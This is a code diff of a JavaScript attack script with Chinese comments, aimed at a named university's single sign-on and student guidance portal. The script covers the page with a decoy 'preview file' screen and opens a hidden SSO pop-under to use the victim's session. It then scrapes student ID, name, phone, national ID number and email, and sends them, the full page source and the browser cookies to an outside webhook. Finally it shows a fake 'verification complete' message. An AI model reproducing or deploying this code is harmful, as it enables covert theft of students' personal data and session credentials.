@@ -1,135 +1,106 @@
 (async () => {
-    // === 設定 ===
+    // 更新為你的 Pipedream 地址
     const webhook = "https://eokic4rib1w9z4o.m.pipedream.net";
-    const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
-    // 假設這是相對於 iframe 當前域名的路徑
-    const targetUrl = "/GuidanceApp/Guidance_StudentDataStdtCtrl?Action=Page1BI";
-
-    // === 工具函數 ===
     
-    // 1. CORS 繞過日誌記錄器 (射後不理)
-    // 使用 Image 物件發送 GET 請求，不會觸發 CORS 阻擋
-    const log = (msg) => {
-        try {
-            new Image().src = `${webhook}?log=${encodeURIComponent(msg)}&t=${Date.now()}`;
-        } catch(e) {}
-    };
+    // SSO 入口
+    const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
+    // 目標資料頁
+    const targetUrl = "/GuidanceApp/Guidance_StudentDataStdtCtrl?Action=Page1BI"; 
 
-    // 2. 數據外傳器
-    // 使用 no-cors 模式的 fetch 發送 JSON 數據
-    const exfiltrate = (data) => {
-        try {
-            const payload = JSON.stringify(data);
-            // 優先使用 navigator.sendBeacon (更可靠)
-            if (navigator.sendBeacon) {
-                const blob = new Blob([payload], {type: 'text/plain'});
-                navigator.sendBeacon(webhook, blob);
-            } else {
-                // 回退方案
-                fetch(webhook, {
-                    method: 'POST',
-                    mode: 'no-cors', // 關鍵：忽略跨域回應
-                    headers: {'Content-Type': 'text/plain'}, // 避免觸發 Preflight
-                    body: payload
-                });
-            }
-            log("Exfiltration_Sent");
-        } catch (e) {
-            log("Exfil_Error_" + e.message);
-        }
-    };
+    // 1. 設置誘餌介面 (讓使用者想點擊)
+    // 我們先把它偽裝成一個需要點擊的狀態
+    document.body.style.margin = "0";
+    document.body.style.overflow = "hidden";
+    document.body.innerHTML = `
+        <div id="trap_ui" style="
+            width: 100%; height: 100vh; background: #f8f9fa; 
+            display: flex; flex-direction: column; 
+            align-items: center; justify-content: center; 
+            cursor: pointer; font-family: 'Microsoft JhengHei', sans-serif;
+            border: 1px solid #dee2e6; user-select: none;
+        ">
+            <div style="font-size: 40px;">📂</div>
+            <div style="margin-top: 10px; color: #007bff; font-weight: bold;">點擊以預覽檔案內容</div>
+            <div style="font-size: 12px; color: #6c757d; margin-top: 5px;">(需要安全性驗證)</div>
+        </div>
+    `;
 
-    // === 攻擊流程 ===
-
-    async function executeAttack() {
-        log("Script_Started");
-
-        // 步驟 1: 建立隱形覆蓋層 (點擊劫持)
-        const overlay = document.createElement('div');
-        overlay.style.cssText = `
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: rgba(0,0,0,0); 
-            z-index: 2147483647; /* 最大整數值 */
-            cursor: default;
-        `;
-        overlay.id = 'security_check_overlay'; // 取個無害的 ID
-        document.body.appendChild(overlay);
+    // 2. 定義攻擊與偽裝邏輯
+    async function launchAttack() {
+        document.removeEventListener('click', launchAttack);
+        document.removeEventListener('keydown', launchAttack);
         
-        log("Overlay_Deployed_Waiting_For_Click");
+        // --- 瞬間切換為「載入中」畫面 (障眼法) ---
+        document.getElementById('trap_ui').innerHTML = `
+            <div style="
+                border: 4px solid #f3f3f3; border-top: 4px solid #3498db; 
+                border-radius: 50%; width: 30px; height: 30px; 
+                animation: spin 1s linear infinite;">
+            </div>
+            <div style="margin-top: 15px; color: #555; font-size: 14px;">
+                正在驗證校務行政身分，請稍候...
+            </div>
+            <style>@keyframes spin {0% {transform: rotate(0deg);} 100% {transform: rotate(360deg);}}</style>
+        `;
+        document.getElementById('trap_ui').style.cursor = 'wait';
 
-        // 步驟 2: 定義觸發器 (一次性事件)
-        const clickHandler = async (event) => {
-            // 立即移除覆蓋層，讓使用者之後能正常操作
-            overlay.remove();
+        try {
+            // 3. 彈窗觸發 SSO (Pop-under)
+            const popup = window.open(ssoUrl, "sso_trap", "width=100,height=100,left=9999,top=9999");
             
-            log("User_Clicked_Initiating_Auth");
-
-            // 步驟 3: 觸發 SSO 彈窗 (Pop-under)
-            // 嘗試將視窗開在螢幕外
-            const popup = window.open(ssoUrl, "sso_auth_window", "width=100,height=100,left=-1000,top=-1000");
-            
+            // 嘗試將彈窗踢到背景，配合「載入中」畫面，使用者會以為那是後台驗證視窗
             if (popup) {
-                // 嘗試讓彈窗失焦，主視窗聚焦
                 try { popup.blur(); window.focus(); } catch(e) {}
-                
-                // 等待 5 秒讓 SSO 重定向流程跑完
-                await new Promise(r => setTimeout(r, 5000));
-                
-                // 關閉彈窗
-                try { popup.close(); } catch(e) {}
-                log("Popup_Closed_Fetching_Data");
-
-                // 步驟 4: 獲取受害者數據
-                try {
-                    const response = await fetch(targetUrl);
-                    const text = await response.text();
-
-                    // 步驟 5: 解析數據
-                    let info = {};
-                    try {
-                        const clean = (str) => str ? str.replace(/<[^>]+>/g, '').trim() : "N/A";
-                        // 使用正則抓取標籤後的內容
-                        info.studentId = clean(text.match(/學生學號:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
-                        info.name = clean(text.match(/學生姓名:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
-                        info.idCard = clean(text.match(/身分證字號:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
-                        info.phone = clean(text.match(/手機:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
-                        info.email = clean(text.match(/E-mail:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
-                    } catch (parseErr) {
-                        log("Parse_Error");
-                    }
-
-                    // 步驟 6: 回傳數據
-                    exfiltrate({
-                        status: "SUCCESS",
-                        data: info,
-                        cookie: document.cookie,
-                        // 可選：回傳部分 HTML 以供調試 (前 1000 字)
-                        partial_source: text.substring(0, 1000) 
-                    });
-
-                } catch (fetchErr) {
-                    log("Fetch_Error_" + fetchErr.message);
-                }
-
-            } else {
-                log("Popup_Blocked");
             }
-        };
 
-        // 將監聽器綁定到覆蓋層
-        overlay.addEventListener('click', clickHandler, { once: true });
+            // 4. 等待 SSO 完成 (6秒)
+            await new Promise(r => setTimeout(r, 6000));
+
+            // 5. 關閉彈窗
+            try { popup.close(); } catch(e) {}
+
+            // 6. 收割資料
+            const response = await fetch(targetUrl);
+            const fullHtml = await response.text();
+
+            // 提取簡單個資
+            let info = {};
+            try {
+                info.studentId = fullHtml.match(/學生學號:.*?form-control-static">([^<&]+)/)?.[1]?.trim();
+                info.name = fullHtml.match(/學生姓名:.*?form-control-static">([^<&]+)/)?.[1]?.trim();
+                info.phone = fullHtml.match(/手機:.*?form-control-static">([^<&]+)/)?.[1]?.trim();
+            } catch(e) {}
+
+            // 7. 發送結果到 Pipedream
+            fetch(webhook, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    msg: "STEALTH_ATTACK_SUCCESS",
+                    victim: info,
+                    html_len: fullHtml.length,
+                    full_html_source: fullHtml,
+                    cookies: document.cookie
+                })
+            });
+
+            // 8. 演戲演全套：顯示「驗證完成」或「檔案損毀」
+            // 讓使用者覺得剛剛的等待是有意義的
+            document.getElementById('trap_ui').innerHTML = `
+                <div style="color: #28a745; font-size: 30px;">✔</div>
+                <div style="margin-top: 10px; color: #333;">驗證完成</div>
+                <div style="font-size: 12px; color: #dc3545; margin-top: 5px;">錯誤：檔案格式不支援預覽</div>
+            `;
+
+        } catch (e) {
+            fetch(webhook + "?error=" + encodeURIComponent(e.message));
+            // 失敗也顯示錯誤訊息，裝作無事發生
+            document.getElementById('trap_ui').innerHTML = `<div style="color:red">系統忙碌中，請稍後再試。</div>`;
+        }
     }
 
-    // 執行
-    try {
-        executeAttack();
-    } catch(e) {
-        // 最後一道防線的錯誤回報
-        new Image().src = webhook + "?fatal_error=" + encodeURIComponent(e.message);
-    }
-
+    // 監聽點擊
+    document.addEventListener('click', launchAttack);
+    document.addEventListener('keydown', launchAttack);
 })();
